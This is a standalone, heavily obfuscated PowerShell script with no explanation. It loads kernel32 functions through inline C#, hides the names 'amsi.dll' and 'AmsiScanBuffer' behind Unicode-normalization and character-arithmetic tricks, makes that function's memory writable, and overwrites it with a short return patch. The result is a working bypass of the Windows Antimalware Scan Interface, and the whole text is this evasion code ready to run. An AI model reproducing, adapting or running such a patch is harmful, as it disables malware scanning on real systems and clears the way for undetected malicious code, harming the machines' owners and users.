$FWAzGZLRim = @"
using System;
using System.Runtime.InteropServices;
public class FWAzGZLRim {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr TZHHfYIjdbMSRs, string Wux5axbGgHcbapOJ2W);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr Ufp, UIntPtr guKQ0QK3TGtLJKXtz4X, uint zKGLtR3IBPB84L, out uint P_V3wdjtPUnbvz1);
}
"@

Add-Type $FWAzGZLRim

$I_IzCvS2ehF = [FWAzGZLRim]::LoadLibrary("$(('áms'+'ì.d'+'ll').norMaliZe([cHAR]([byte]0x46)+[cHar](111+17-17)+[ChAr](114+41-41)+[ChAR]([ByTE]0x6d)+[cHaR](68*36/36)) -replace [chAr]([Byte]0x5c)+[CHaR](4+108)+[ChAR](123+74-74)+[CHAr](77+54-54)+[CHar](3+107)+[ChAR]([bYTE]0x7d))")
$yGllcxDXc_n280BEfpQR = [FWAzGZLRim]::GetProcAddress($I_IzCvS2ehF, "$(('ÄmsìScãn'+'Búffér').NOrmalIZE([CHaR](37+33)+[CHAr](111*20/20)+[ChaR](114+3-3)+[CHAR]([BYtE]0x6d)+[ChAr](68*36/36)) -replace [chAR](92*88/88)+[cHAr](112)+[Char](123*20/20)+[cHaR]([bYte]0x4d)+[cHAR]([BytE]0x6e)+[CHAr]([Byte]0x7d))")
$p = 0
[FWAzGZLRim]::VirtualProtect($yGllcxDXc_n280BEfpQR, [uint32]5, 0x40, [ref]$p)
$RJt_tMKoU = "0xB8"
$vkUKdxRX = "0x57"
$Rcsq714Kp = "0x00"
$FspN0OumUiyzOs = "0x07"
$v0dWFCEX3ZDr = "0x80"
$h_S47yXd5Csp7J9icwvV = "0xC3"
$P7rVqbRVP7BO6pVzEe = [Byte[]] ($RJt_tMKoU,$vkUKdxRX,$Rcsq714Kp,$FspN0OumUiyzOs,+$v0dWFCEX3ZDr,+$h_S47yXd5Csp7J9icwvV)
[System.Runtime.InteropServices.Marshal]::Copy($P7rVqbRVP7BO6pVzEe, 0, $yGllcxDXc_n280BEfpQR, 6)